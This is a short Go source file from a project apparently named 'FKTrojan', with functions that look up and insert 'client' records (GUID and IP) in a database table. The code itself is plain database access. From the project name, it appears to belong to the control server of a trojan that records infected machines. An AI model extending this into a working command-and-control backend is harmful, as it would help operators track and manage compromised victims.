package database

import (
	. "FKTrojan/dao"
	"FKTrojan/flog"
	"fmt"
)

func UpdateClient(client *Client) error {
	return nil
}

func queryClient(uid string) (*Client, error) {
	r := dbPointer.QueryRow("select guid from clients where guid=?", uid)
	if r == nil {
		return nil, fmt.Errorf("can not find client for %s", uid)
	}
	client := Client{}
	err := r.Scan(&client.GUID)
	if err != nil {
		return nil, err
	}
	return &client, nil
}

func InsertClientIfNotExist(client *Client) error {
	// 简单的一致性保证
	Lock()
	defer Unlock()
	q, err := queryClient(client.GUID)
	if err != nil {
		Flog.Flog.Printf("query client error %v", err)
	}
	if q == nil {
		_, err = dbPointer.Exec("insert into clients (guid, ip) values (?,?)", client.GUID, client.IP)
	}
	return err
}
